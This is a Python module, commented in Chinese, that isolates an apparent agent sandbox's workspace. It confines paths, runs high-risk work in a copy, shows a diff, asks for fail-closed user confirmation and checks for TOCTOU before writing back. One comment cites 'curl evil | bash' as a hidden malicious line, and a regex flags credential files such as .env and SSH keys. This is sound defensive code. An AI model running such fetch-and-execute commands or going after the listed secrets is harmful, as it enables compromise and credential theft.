"""工作区隔离: direct(直接+限路径) 与 copy-diff-apply(副本→diff→确认→apply) 融合。

"取精华去糟粕":
  - 低危/良性操作走 direct —— 工作区直接读写, 仅把路径限界在工作区内(快、透明, 不打扰)。
  - 高危/不可逆操作走 copy-diff-apply —— 先在隔离副本里跑, 结束后比对变更, 由用户确认
    apply 才写回真实工作区(慢但可回滚, 破坏性操作有后悔药)。

Snapshotter 提供基于内容哈希的工作区差异与回放, 供高层隔离执行模块调用。
"""
from __future__ import annotations

import hashlib
import os
import re
import shutil
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

_IGNORED = {".git", ".hg", ".svn", "__pycache__", ".venv", "venv",
            "node_modules", ".tuan-sandbox", ".idea", ".vscode"}


# ---------------------------------------------------------------- 路径限界 (direct)
def resolve_in_workspace(workspace: str, path: str) -> str:
    """把 path 解析到工作区内, 越界即抛 ValueError (限路径的核心)。"""

    def _norm(p: str) -> str:
        return os.path.normcase(os.path.realpath(p))

    root = _norm(workspace)
    cand = Path(path)
    if not cand.is_absolute():
        cand = Path(workspace) / cand
    resolved = _norm(str(cand))
    if not (resolved == root or resolved.startswith(root + os.sep)):
        raise ValueError(f"路径越出工作区边界: {path}")
    return resolved


@dataclass
class Snapshot:
    """一个工作区的内容指纹: relpath -> sha1 (只记录普通文件)。"""

    root: str
    files: Dict[str, str] = field(default_factory=dict)

    @classmethod
    def capture(cls, workspace: str, ignore: Optional[set] = None) -> "Snapshot":
        root = os.path.realpath(workspace)
        ignore = ignore or _IGNORED
        snap = cls(root)
        for dirpath, dirnames, filenames in os.walk(root):
            # E7: 旧实现有两处致命问题 ——
            #  1) `not d.startswith(".")` 把所有点开头目录 (.github / .config /
            #     .husky / .ssh ...) 全跳过, 于是副本里改 `.github/workflows/ci.yml`
            #     时 diff() 返回空 —— 用户确认界面显示「无变更」, 而实际有改动。
            #     这对「确认前必须看到全部变更」是致命的: 恶意内容可藏进看不见的路径。
            #  2) 紧接着又做一次 `dirnames[:] = ...` 覆盖第一次结果, 逻辑重复。
            # 现在只跳过 _IGNORED (依赖/构建/VCS 元数据) 与隔离副本自身,
            # 其余隐藏目录一律纳入快照, 保证确认清单完整。
            dirnames[:] = [d for d in dirnames
                           if d not in ignore and not d.startswith(".tuan-sandbox")]
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                rel = os.path.relpath(full, root)
                try:
                    snap.files[rel] = _sha1(full)
                except OSError:
                    continue
        return snap

    def diff(self, other: "Snapshot") -> List[Dict[str, str]]:
        """对比另一个快照, 返回变更列表 (added/modified/deleted)。"""
        changes: List[Dict[str, str]] = []
        for rel, sha in self.files.items():
            if rel not in other.files:
                changes.append({"path": rel, "status": "deleted"})
            elif other.files[rel] != sha:
                changes.append({"path": rel, "status": "modified"})
        for rel in other.files:
            if rel not in self.files:
                changes.append({"path": rel, "status": "added"})
        return sorted(changes, key=lambda c: c["path"])

    def apply(self, other: "Snapshot", *, dry_run: bool = False,
              on_apply: Optional[Callable[[str, str], None]] = None,
              backup: bool = True) -> List[str]:
        """把 other 的状态回放到 self 的工作区 (即 apply).

        other 通常是"隔离副本运行后"的新快照。dry_run=True 只统计。
        """
        applied: List[str] = []
        root = Path(self.root)
        for rel, sha in other.files.items():
            src = os.path.join(other.root, rel)
            dst = os.path.join(root, rel)
            if rel in self.files and self.files[rel] == sha:
                continue  # 无变化
            if dry_run:
                applied.append(rel)
                continue
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            if backup and os.path.exists(dst):
                _backup(dst)
            try:
                shutil.copy2(src, dst)
            except OSError:
                continue
            applied.append(rel)
            if on_apply:
                on_apply(rel, "modified")
        # 删除隔离副本里不存在的工作区文件
        for rel in list(self.files):
            if rel not in other.files:
                dst = os.path.join(root, rel)
                if dry_run:
                    applied.append(rel)
                    continue
                if os.path.exists(dst):
                    if backup:
                        _backup(dst)
                    try:
                        os.unlink(dst)
                    except OSError:
                        continue
                applied.append(rel)
                if on_apply:
                    on_apply(rel, "deleted")
        return applied


def _sha1(path: str) -> str:
    h = hashlib.sha1()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 16), b""):
            h.update(chunk)
    return h.hexdigest()


def _backup(path: str) -> None:
    bakdir = os.path.join(tempfile.gettempdir(), "tuan-sandbox-backup")
    os.makedirs(bakdir, exist_ok=True)
    # basename 相同但目录不同的文件 (如 src/main.py 与 lib/main.py) 备份会互相
    # 覆盖, 使回滚丢失其一; 用父目录哈希消歧, 同时保留可读文件名。
    d = os.path.dirname(os.path.abspath(path))
    tag = hashlib.sha1(d.encode("utf-8")).hexdigest()[:8]
    name = f"{os.path.basename(path)}.{tag}.bak"
    try:
        shutil.copy2(path, os.path.join(bakdir, name))
    except OSError:
        pass


# ---------------------------------------------------------------- E7: diff 可视化确认
# 确认前必须让用户看清"改了什么"。旧的 diff() 只有 path + status 两列 ——
# 用户看到 `modified main.py` 却不知道那一行是不是 `curl evil | bash`, 这样的
# 确认没有意义。另外敏感文件 (.env / 私钥 / credentials) 必须显式高亮。

_SENSITIVE_FILE_RE = re.compile(
    r"(?:^|/)(?:"
    r"\.env(?:\.|$) | \.npmrc | \.pypirc | \.netrc | \.htpasswd | "
    r"id_(?:rsa|ed25519|ecdsa|dsa) | "
    r"[^/]*\.(?:pem|key|p12|pfx|keystore|jks) | "
    r"credentials(?:\.json)? | service-account[^/]*\.json | "
    r"\.git/config | \.ssh/[^/]+ | "
    r"[^/]*(?:secret|token|password)[^/]*\.(?:json|yaml|yml|toml|ini|txt)"
    r")$", re.IGNORECASE | re.VERBOSE,
)

_PREVIEW_MAX_LINES = 20
_PREVIEW_MAX_BYTES = 4096


def is_sensitive_path(path: str) -> bool:
    rel = str(path or "").replace("\\", "/")
    return bool(_SENSITIVE_FILE_RE.search(rel))


@dataclass
class DiffEntry:
    """一条可展示的变更 (比 path/status 多出内容预览与敏感标记)。"""
    path: str
    status: str                 # added | modified | deleted
    size_before: int = 0
    size_after: int = 0
    preview: str = ""           # 文本前 N 行; 二进制/删除为空
    binary: bool = False
    sensitive: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "path": self.path, "status": self.status,
            "size_before": self.size_before, "size_after": self.size_after,
            "preview": self.preview, "binary": self.binary,
            "sensitive": self.sensitive,
        }


@dataclass
class DiffPreview:
    """一次副本会话的完整变更清单 (供 CLI / TUI / Web 消费的结构化数据)。"""
    entries: List[DiffEntry] = field(default_factory=list)
    original: str = ""
    copy: str = ""
    fingerprint: str = ""       # 生成预览时副本快照的指纹 (TOCTOU 复检用)

    @property
    def total(self) -> int:
        return len(self.entries)

    @property
    def sensitive_count(self) -> int:
        return sum(1 for e in self.entries if e.sensitive)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "total": self.total,
            "sensitive_count": self.sensitive_count,
            "original": self.original,
            "copy": self.copy,
            "fingerprint": self.fingerprint,
            "entries": [e.to_dict() for e in self.entries],
        }

    def to_text(self) -> str:
        """纯文本渲染 —— CLI 可直接 print, TUI 可整段塞进确认卡片。"""
        lines = [
            "=== 隔离副本变更预览 (确认后才会写回真实工作区) ===",
            f"副本: {self.copy}",
            f"原始: {self.original}",
            f"变更文件: {self.total} 个"
            + (f"  [!] 其中敏感文件 {self.sensitive_count} 个" if self.sensitive_count else ""),
        ]
        if not self.entries:
            lines.append("(无变更)")
        for e in self.entries:
            flag = " [!敏感]" if e.sensitive else ""
            size = f"{e.size_before} -> {e.size_after} bytes"
            lines.append(f"\n[{e.status.upper()}] {e.path}{flag}  ({size})")
            if e.binary:
                lines.append("  (二进制文件, 不展示内容)")
            elif e.preview:
                for ln in e.preview.splitlines():
                    lines.append(f"  | {ln}")
        lines.append("\n=== 预览结束 ===")
        return "\n".join(lines)


def _snapshot_fingerprint(snap: "Snapshot") -> str:
    """副本快照指纹: sorted(relpath:sha1) 的 sha256, 用于确认后 TOCTOU 复检。"""
    h = hashlib.sha256()
    for rel in sorted(snap.files):
        h.update(f"{rel}:{snap.files[rel]}\n".encode("utf-8", "replace"))
    return h.hexdigest()


def _read_preview(path: str) -> "tuple[str, bool]":
    """读取文本片段; 二进制返回 (空, True)。不跟随符号链接外泄。"""
    try:
        with open(path, "rb") as f:
            raw = f.read(_PREVIEW_MAX_BYTES)
        if b"\x00" in raw:
            return "", True
        text = raw.decode("utf-8", "replace")
        lines = text.splitlines()[:_PREVIEW_MAX_LINES]
        return "\n".join(lines), False
    except OSError:
        return "", True


def build_diff_preview(wd: "IsolatedWorkdir") -> DiffPreview:
    """从隔离副本构建结构化预览 (不修改任何文件, 不写回)。"""
    assert wd._base is not None, "未 solid(), 无法生成预览"
    copy_snap = Snapshot.capture(wd.path)
    base = wd._base
    preview = DiffPreview(original=wd.original, copy=wd.path,
                          fingerprint=_snapshot_fingerprint(copy_snap))
    for change in base.diff(copy_snap):
        rel = change["path"]
        status = change["status"]
        before_path = os.path.join(wd.original, rel)
        after_path = os.path.join(wd.path, rel)
        size_before = 0
        size_after = 0
        try:
            if os.path.isfile(before_path):
                size_before = os.path.getsize(before_path)
        except OSError:
            pass
        content, binary = "", True
        if status != "deleted":
            try:
                size_after = os.path.getsize(after_path)
            except OSError:
                pass
            content, binary = _read_preview(after_path)
        preview.entries.append(DiffEntry(
            path=rel, status=status,
            size_before=size_before, size_after=size_after,
            preview=content, binary=binary,
            sensitive=is_sensitive_path(rel),
        ))
    return preview


@dataclass
class ApplyResult:
    """确认并 apply 的结果 (不抛异常给主链路)。"""
    applied: bool = False
    reason: str = ""
    files: List[str] = field(default_factory=list)
    preview: Optional[DiffPreview] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "applied": self.applied, "reason": self.reason,
            "files": list(self.files),
            "preview": self.preview.to_dict() if self.preview else None,
        }


def confirm_apply(wd: "IsolatedWorkdir", confirm: Optional[Callable[[str], bool]],
                  *, card_renderer: Optional[Callable[[Dict[str, Any]], str]] = None,
                  max_preview_lines: int = _PREVIEW_MAX_LINES) -> ApplyResult:
    """展示 diff -> 用户确认 -> **复检副本未被改动** -> apply。

    fail-closed 契约:
    - confirm 为 None / 抛异常 / 返回非 True  -> 不写回;
    - 确认期间副本发生变化 (TOCTOU)          -> 不写回, 要求重新预览;
    - 预览或 apply 任一异常                   -> 不写回, 返回原因。

    刻意不引入快照缓存: 用户上一轮明确拒绝"判定依赖文件系统时间点"的缓存,
    这里改为确认后重新 capture 并比对指纹, 无缓存、无 TOCTOU 窗口内的陈旧判定。
    """
    try:
        preview = build_diff_preview(wd)
        # E7-TUI: 卡片渲染器由上层注入 (借鉴 Codex approval_overlay 的
        # "UI 只呈现、不判安全" 分层)。生成失败仍 fail-closed 不写回。
        card_text = (card_renderer(preview.to_dict())
                     if card_renderer is not None else preview.to_text())
    except Exception as exc:  # noqa: BLE001
        return ApplyResult(False, f"生成变更预览失败 (fail-closed): {type(exc).__name__}: {exc}")
    if confirm is None:
        return ApplyResult(False, "缺少确认通道, 按 fail-closed 拒绝写回", preview=preview)
    try:
        approved = confirm(card_text)
    except Exception as exc:  # noqa: BLE001
        return ApplyResult(False, f"确认通道异常, 按 fail-closed 拒绝写回: {type(exc).__name__}: {exc}",
                           preview=preview)
    if approved is not True:
        return ApplyResult(False, "用户拒绝或未确认变更, 不写回", preview=preview)
    # TOCTOU 复检: 确认过程中副本可能被子进程/外部改动
    try:
        if _snapshot_fingerprint(Snapshot.capture(wd.path)) != preview.fingerprint:
            return ApplyResult(False, "副本在确认期间发生变化, 请重新预览后再确认 (TOCTOU 防护)",
                               preview=preview)
        files = wd.apply()
    except Exception as exc:  # noqa: BLE001
        return ApplyResult(False, f"写回失败: {type(exc).__name__}: {exc}", preview=preview)
    return ApplyResult(True, "用户已确认, 变更已写回", files=files, preview=preview)


def plan_isolation(severity: str, *, mode: str = "auto") -> str:
    """按严重度选择工作区隔离模式 (融合决策的入口)。

    mode: auto(按严重度) / direct(强制 direct) / copy_diff_apply(强制副本回放)。
    低危(<=medium) → direct; 高危/critical 且配 copy_diff_apply → copy_diff_apply。
    """
    if mode != "auto":
        return mode
    rank = {"none": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
    return "copy_diff_apply" if rank.get(severity, 0) >= 3 else "direct"


class WorkdirIsolation:
    """direct 模式: 真工作区 + 路径限界 (不复制)。"""

    def resolve(self, workspace: str, path: str) -> str:
        return resolve_in_workspace(workspace, path)


@dataclass
class IsolatedWorkdir:
    """copy-diff-apply 模式的一次隔离会话。

    用法:
        wd = isolate_workdir(workspace)     # 复制出独立副本, 并记录原始快照
        run_command_in(wd.path, cmd)        # (由高层执行端调用)
        changes = wd.diff()                 # 比对隔离副本与原始工作区的变更
        wd.apply()                          # 把副本变更回写真实工作区
        wd.cleanup()                        # 无论成败都清理副本
    """

    original: str
    path: str
    _base: Optional[Snapshot] = None

    def solid(self) -> "IsolatedWorkdir":
        self._base = Snapshot.capture(self.original)
        return self

    def diff(self) -> List[Dict[str, str]]:
        assert self._base is not None, "未 solid(), 无法 diff"
        return self._base.diff(Snapshot.capture(self.path))

    def apply(self, *, dry_run: bool = False) -> List[str]:
        assert self._base is not None, "未 solid(), 无法 apply"
        base_orig = Snapshot(self.original, dict(self._base.files))
        return base_orig.apply(Snapshot.capture(self.path), dry_run=dry_run)

    def cleanup(self) -> None:
        try:
            shutil.rmtree(self.path, ignore_errors=True)
        except Exception:  # pragma: no cover
            pass


def isolate_workdir(workspace: str, parent: Optional[str] = None) -> IsolatedWorkdir:
    """在工作区旁创建隔离副本目录, 并记录原始快照。"""
    base = parent or os.path.dirname(os.path.abspath(workspace))
    import uuid
    dest = os.path.join(base, f".tuan-sandbox-{uuid.uuid4().hex[:8]}")
    os.makedirs(dest, exist_ok=True)
    wd = IsolatedWorkdir(original=os.path.realpath(workspace), path=dest)
    _copy_tree(workspace, dest)
    wd.solid()
    return wd


def _copy_tree(src: str, dst: str) -> None:
    src_p = Path(src)
    for item in src_p.iterdir():
        if item.name in _IGNORED or item.name.startswith(".tuan-sandbox"):
            continue
        d_item = Path(dst) / item.name
        try:
            if item.is_dir():
                shutil.copytree(item, d_item, ignore=shutil.ignore_patterns(
                    *_IGNORED))
            else:
                shutil.copy2(item, d_item)
        except (OSError, shutil.Error):
            continue